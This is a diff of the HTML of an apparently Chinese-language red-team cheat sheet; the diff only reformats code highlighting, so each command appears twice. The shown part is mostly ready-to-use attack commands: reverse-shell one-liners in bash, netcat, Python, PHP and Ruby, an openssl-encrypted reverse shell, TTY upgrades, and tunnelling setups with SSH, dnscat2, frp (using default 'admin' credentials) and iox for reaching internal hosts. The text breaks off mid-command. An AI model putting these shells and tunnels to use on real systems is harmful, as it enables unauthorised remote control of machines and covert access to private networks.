@@ -272,10 +272,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Usage: SharpNetCheck -dns -host ceye.io
-       SharpNetCheck -http -host/ip ceye.io
-       SharpNetCheck -all -host ceye.io
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Usage: SharpNetCheck -dns -host ceye.io
+</span></span><span class="line"><span class="cl">       SharpNetCheck -http -host/ip ceye.io
+</span></span><span class="line"><span class="cl">       SharpNetCheck -all -host ceye.io
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="2-反弹-shell">2 反弹 shell</h2>
 <h3 id="21-bash">2.1 Bash</h3>
@@ -289,12 +289,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/ip/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
-bash -i &gt; /dev/tcp/ip/port 0&lt;<span class="p">&amp;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
-<span class="nb">exec</span> 5&lt;&gt;/dev/tcp/ip/port<span class="p">;</span>cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span>
-<span class="nb">exec</span> /bin/sh 0&lt;/dev/tcp/ip/port 1&gt;<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span><span class="m">0</span>
-0&lt;<span class="p">&amp;</span>196<span class="p">;</span><span class="nb">exec</span> 196&lt;&gt;/dev/tcp/ip/port<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> 2&gt;<span class="p">&amp;</span><span class="m">196</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/ip/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">bash -i &gt; /dev/tcp/ip/port 0&lt;<span class="p">&amp;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 5&lt;&gt;/dev/tcp/ip/port<span class="p">;</span>cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> /bin/sh 0&lt;/dev/tcp/ip/port 1&gt;<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">0&lt;<span class="p">&amp;</span>196<span class="p">;</span><span class="nb">exec</span> 196&lt;&gt;/dev/tcp/ip/port<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> 2&gt;<span class="p">&amp;</span><span class="m">196</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="212-bash-udp">2.1.2 Bash UDP</h4>
 <div class="highlight"><div class="chroma">
@@ -306,12 +306,12 @@ bash -i &gt; /dev/tcp/ip/port 0&lt;<span class="p">&amp;</span> 2&gt;<span class
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Victim:
-sh -i &gt;<span class="p">&amp;</span> /dev/udp/10.0.0.1/4242 0&gt;<span class="p">&amp;</span><span class="m">1</span>
-
-Listener:
-nc -u -lvp <span class="m">4242</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Victim:
+</span></span><span class="line"><span class="cl">sh -i &gt;<span class="p">&amp;</span> /dev/udp/10.0.0.1/4242 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Listener:
+</span></span><span class="line"><span class="cl">nc -u -lvp <span class="m">4242</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="22-应用内反弹-shell">2.2 应用内反弹 shell</h3>
 <h4 id="221-netcat">2.2.1 netcat</h4>
@@ -323,11 +323,11 @@ nc -u -lvp <span class="m">4242</span>
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ncat ip port -e /bin/bash
-nc -e /bin/bash ip port
-rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc ip port &gt;/tmp/f
-rm -f x<span class="p">;</span> mknod x p <span class="o">&amp;&amp;</span> nc ip port 0&lt;x <span class="p">|</span> /bin/bash 1&gt;x
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat ip port -e /bin/bash
+</span></span><span class="line"><span class="cl">nc -e /bin/bash ip port
+</span></span><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc ip port &gt;/tmp/f
+</span></span><span class="line"><span class="cl">rm -f x<span class="p">;</span> mknod x p <span class="o">&amp;&amp;</span> nc ip port 0&lt;x <span class="p">|</span> /bin/bash 1&gt;x
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="222-python">2.2.2 python</h4>
 <div class="highlight"><div class="chroma">
@@ -338,11 +338,11 @@ rm -f x<span class="p">;</span> mknod x p <span class="o">&amp;&amp;</span> nc i
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;ip&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
-
-<span class="c1"># windows only</span>
-python -c <span class="s1">&#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&#34;/bin/sh&#34;);&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;ip&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># windows only</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&#34;/bin/sh&#34;);&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="details admonition tip open">
         <div class="details-summary admonition-title">
@@ -362,14 +362,14 @@ python -c <span class="s1">&#39;import socket,subprocess,os,pty;s=socket.socket(
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-Ctrl-Z
-$ stty raw -echo
-$ <span class="nb">fg</span>
-$ reset
-$ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
-//$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">Ctrl-Z
+</span></span><span class="line"><span class="cl">$ stty raw -echo
+</span></span><span class="line"><span class="cl">$ <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">$ reset
+</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span><span class="line"><span class="cl">//$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
         </div>
@@ -384,12 +384,12 @@ $ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=<
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;ip&#34;,port);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
-
-<span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$s=fsockopen(&#34;ip&#34;,port);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;</span>
-  
-<span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$s=fsockopen(&#34;ip&#34;,port);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;ip&#34;,port);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$s=fsockopen(&#34;ip&#34;,port);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$s=fsockopen(&#34;ip&#34;,port);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="224-ruby">2.2.4 Ruby</h4>
 <div class="highlight"><div class="chroma">
@@ -400,11 +400,11 @@ $ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=<
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ruby -rsocket -e<span class="s1">&#39;f=TCPSocket.open(&#34;ip&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
-
-<span class="c1"># windows only</span>
-ruby -rsocket -e <span class="s1">&#39;c=TCPSocket.new(&#34;ip&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ruby -rsocket -e<span class="s1">&#39;f=TCPSocket.open(&#34;ip&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># windows only</span>
+</span></span><span class="line"><span class="cl">ruby -rsocket -e <span class="s1">&#39;c=TCPSocket.new(&#34;ip&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="23-openssl-流量加密">2.3 openssl 流量加密</h3>
 <div class="highlight"><div class="chroma">
@@ -433,29 +433,29 @@ ruby -rsocket -e <span class="s1">&#39;c=TCPSocket.new(&#34;ip&#34;,&#34;port&#3
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># VPS 生成 SSL 证书的公私钥对</span>
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes
-
-<span class="c1"># 在 VPS 监听反弹 shell</span>
-openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="m">4433</span>
-
-<span class="c1"># 在目标上用 openssl 加密反弹 shell 的流量(linux)</span>
-mkfifo /tmp/s<span class="p">;</span> /bin/sh -i &lt; /tmp/s 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> openssl s_client -quiet -connect IP:port &gt; /tmp/s<span class="p">;</span> rm /tmp/s
-
-<span class="c1"># windows</span>
-openssl s_client -quiet -connect <span class="o">[</span>ip<span class="o">]</span>:<span class="o">[</span>port1<span class="o">]</span> <span class="p">|</span> cmd.exe <span class="p">|</span> openssl s_client -quiet -connect <span class="o">[</span>ip<span class="o">]</span>:<span class="o">[</span>port2<span class="o">]</span>
-
-<span class="c1"># 以上命令会从 [ip]:[port1] 获取命令发送给 cmd.exe执行，然后把结果返回到 [ip]:[port2]</span>
-
-<span class="c1"># 因此在本机需要启动两个 s_server</span>
-
-<span class="c1"># 从 port1 发送命令到 cmd</span>
-
-openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</span>port1<span class="o">]</span> 
-<span class="c1"># 从 port2 获取发送给 port1 的命令执行结果</span>
-
-openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</span>port2<span class="o">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># VPS 生成 SSL 证书的公私钥对</span>
+</span></span><span class="line"><span class="cl">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 在 VPS 监听反弹 shell</span>
+</span></span><span class="line"><span class="cl">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="m">4433</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 在目标上用 openssl 加密反弹 shell 的流量(linux)</span>
+</span></span><span class="line"><span class="cl">mkfifo /tmp/s<span class="p">;</span> /bin/sh -i &lt; /tmp/s 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> openssl s_client -quiet -connect IP:port &gt; /tmp/s<span class="p">;</span> rm /tmp/s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># windows</span>
+</span></span><span class="line"><span class="cl">openssl s_client -quiet -connect <span class="o">[</span>ip<span class="o">]</span>:<span class="o">[</span>port1<span class="o">]</span> <span class="p">|</span> cmd.exe <span class="p">|</span> openssl s_client -quiet -connect <span class="o">[</span>ip<span class="o">]</span>:<span class="o">[</span>port2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 以上命令会从 [ip]:[port1] 获取命令发送给 cmd.exe执行，然后把结果返回到 [ip]:[port2]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 因此在本机需要启动两个 s_server</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 从 port1 发送命令到 cmd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</span>port1<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># 从 port2 获取发送给 port1 的命令执行结果</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</span>port2<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="24-all-in-one">2.4 All in One</h3>
 <p>以下是几个自动生成反弹 shell 命令的网站：</p>
@@ -510,14 +510,14 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</spa
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># -u 远程代理脚本地址</span>
-<span class="c1"># -l 表示本地监听的端口</span>
-<span class="c1"># -r 远程映射端口</span>
-<span class="c1"># -v 输出详细数据</span>
-<span class="c1"># -a 代理远程连接的主机地址</span>
-python proxy.py -u http://ip/conn.aspx -l <span class="m">1080</span> -v
-python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span class="m">8080</span> -s -v -n
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -u 远程代理脚本地址</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -l 表示本地监听的端口</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -r 远程映射端口</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -v 输出详细数据</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -a 代理远程连接的主机地址</span>
+</span></span><span class="line"><span class="cl">python proxy.py -u http://ip/conn.aspx -l <span class="m">1080</span> -v
+</span></span><span class="line"><span class="cl">python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span class="m">8080</span> -s -v -n
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li><a href="https://github.com/nccgroup/ABPTTS" target="_blank" rel="noopener noreffer">abptts</a></li>
@@ -534,8 +534,8 @@ python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span c
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -L 8866:192.168.10.3:23 -fN 192.168.10.2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -L 8866:192.168.10.3:23 -fN 192.168.10.2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -553,8 +553,8 @@ python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span c
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -R 8866:192.168.10.3:23 -fN 192.168.10.1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -R 8866:192.168.10.3:23 -fN 192.168.10.1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -572,8 +572,8 @@ python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span c
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -D <span class="m">1100</span> -fN 192.168.10.2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -D <span class="m">1100</span> -fN 192.168.10.2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -601,14 +601,14 @@ python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span c
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">apt-get install gem
-apt-get install ruby-dev
-apt-get install libpq-dev
-apt-get install ruby-bundler
-apt-get install git
-git clone https://github.com/iagox86/dnscat2
-bundle install
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install gem
+</span></span><span class="line"><span class="cl">apt-get install ruby-dev
+</span></span><span class="line"><span class="cl">apt-get install libpq-dev
+</span></span><span class="line"><span class="cl">apt-get install ruby-bundler
+</span></span><span class="line"><span class="cl">apt-get install git
+</span></span><span class="line"><span class="cl">git clone https://github.com/iagox86/dnscat2
+</span></span><span class="line"><span class="cl">bundle install
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="333-启动服务端">3.3.3 启动服务端</h4>
 <div class="highlight"><div class="chroma">
@@ -616,8 +616,8 @@ bundle install
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ruby ./dnscat2.rb dnscat.yuming.com -e open -c mima --no-cache
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ruby ./dnscat2.rb dnscat.yuming.com -e open -c mima --no-cache
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="334-启动客户端">3.3.4 启动客户端</h4>
 <div class="highlight"><div class="chroma">
@@ -629,12 +629,12 @@ bundle install
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 测试能否通信</span>
-dnscat-client.exe -ping dnscat.yuming.com
-
-<span class="c1"># 连接</span>
-dnscat-client.exe --dns <span class="nv">domain</span><span class="o">=</span>dnscat.yuming.com -secret mima
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 测试能否通信</span>
+</span></span><span class="line"><span class="cl">dnscat-client.exe -ping dnscat.yuming.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 连接</span>
+</span></span><span class="line"><span class="cl">dnscat-client.exe --dns <span class="nv">domain</span><span class="o">=</span>dnscat.yuming.com -secret mima
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-传输层">4 传输层</h2>
 <p>SOCKS4 支持 telnet、FTP、HTTP 等 TCP 协议</p>
@@ -658,17 +658,17 @@ dnscat-client.exe --dns <span class="nv">domain</span><span class="o">=</span>dn
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[common]
-# frp 服务端端口
-bind_port = 7000
-# 仪表盘端口
-dashboard_port = 8888
-# frp服务端密码
-token = 123456
-# 仪表盘默认账号密码
-dashboard_user = admin
-dashboard_pwd = admin
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[common]
+</span></span><span class="line"><span class="cl"># frp 服务端端口
+</span></span><span class="line"><span class="cl">bind_port = 7000
+</span></span><span class="line"><span class="cl"># 仪表盘端口
+</span></span><span class="line"><span class="cl">dashboard_port = 8888
+</span></span><span class="line"><span class="cl"># frp服务端密码
+</span></span><span class="line"><span class="cl">token = 123456
+</span></span><span class="line"><span class="cl"># 仪表盘默认账号密码
+</span></span><span class="line"><span class="cl">dashboard_user = admin
+</span></span><span class="line"><span class="cl">dashboard_pwd = admin
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>启动 FRP：<code>frps -c frps.ini</code></p>
 <h4 id="412-客户端">4.1.2 客户端</h4>
@@ -688,19 +688,19 @@ dashboard_pwd = admin
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[common]
-server_addr = VPS IP
-server_port = 7000
-# 与 vps 保持一致
-token = 123456
-[ssh]
-type = tcp
-local_ip = 127.0.0.1
-local_port = 22
-remote_port = 7000
-use_encryption = true
-use_compression = true
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[common]
+</span></span><span class="line"><span class="cl">server_addr = VPS IP
+</span></span><span class="line"><span class="cl">server_port = 7000
+</span></span><span class="line"><span class="cl"># 与 vps 保持一致
+</span></span><span class="line"><span class="cl">token = 123456
+</span></span><span class="line"><span class="cl">[ssh]
+</span></span><span class="line"><span class="cl">type = tcp
+</span></span><span class="line"><span class="cl">local_ip = 127.0.0.1
+</span></span><span class="line"><span class="cl">local_port = 22
+</span></span><span class="line"><span class="cl">remote_port = 7000
+</span></span><span class="line"><span class="cl">use_encryption = true
+</span></span><span class="line"><span class="cl">use_compression = true
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-iox">4.2 iox</h3>
 <p>iox 是一个端口转发 &amp; 内网代理工具，功能类似于<code>lcx</code>/<code>ew</code>，但是比它们更好。</p>
@@ -718,15 +718,15 @@ use_compression = true
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 端口转发 - 从本地 8888 转到 9999</span>
-./iox fwd -l <span class="m">8888</span> -l <span class="m">9999</span>
-
-<span class="c1"># 端口转发 - 从本地 8888，把流量转发到 1.1.1.1:9999</span>
-./iox fwd -l <span class="m">8888</span> -r 1.1.1.1:9999
-
-<span class="c1"># 连接 1.1.1.1:8888 和 1.1.1.1:9999, 在两个连接间转发</span>
-./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 端口转发 - 从本地 8888 转到 9999</span>
+</span></span><span class="line"><span class="cl">./iox fwd -l <span class="m">8888</span> -l <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 端口转发 - 从本地 8888，把流量转发到 1.1.1.1:9999</span>
+</span></span><span class="line"><span class="cl">./iox fwd -l <span class="m">8888</span> -r 1.1.1.1:9999
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 连接 1.1.1.1:8888 和 1.1.1.1:9999, 在两个连接间转发</span>
+</span></span><span class="line"><span class="cl">./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="422-代理">4.2.2 代理</h4>
 <div class="highlight"><div class="chroma">
@@ -748,22 +748,22 @@ use_compression = true
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 在本地 0.0.0.0:1080 启动 Socks5 服务 - 正向代理</span>
-./iox proxy -l <span class="m">1080</span>
-
-
-<span class="c1"># 反向代理</span>
-<span class="c1"># 在被控机开启 Socks5 服务，将服务转发到公网 VPS</span>
-./iox proxy -r 1.1.1.1:9999
-
-<span class="c1"># 在 VPS 上转发 0.0.0.0:9999 到 0.0.0.0:1080</span>
-<span class="c1"># 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连</span>
-./iox proxy -l <span class="m">9999</span> -l <span class="m">1080</span>       // 注意，这两个端口是有顺序的
-
-<span class="c1"># 接着连接内网主机</span>
-<span class="c1"># socks5://1.1.1.1:1080</span>
-proxychains rdesktop 192.168.0.100:3389
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 在本地 0.0.0.0:1080 启动 Socks5 服务 - 正向代理</span>
+</span></span><span class="line"><span class="cl">./iox proxy -l <span class="m">1080</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 反向代理</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 在被控机开启 Socks5 服务，将服务转发到公网 VPS</span>
+</span></span><span class="line"><span class="cl">./iox proxy -r 1.1.1.1:9999
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 在 VPS 上转发 0.0.0.0:9999 到 0.0.0.0:1080</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连</span>
+</span></span><span class="line"><span class="cl">./iox proxy -l <span class="m">9999</span> -l <span class="m">1080</span>       // 注意，这两个端口是有顺序的
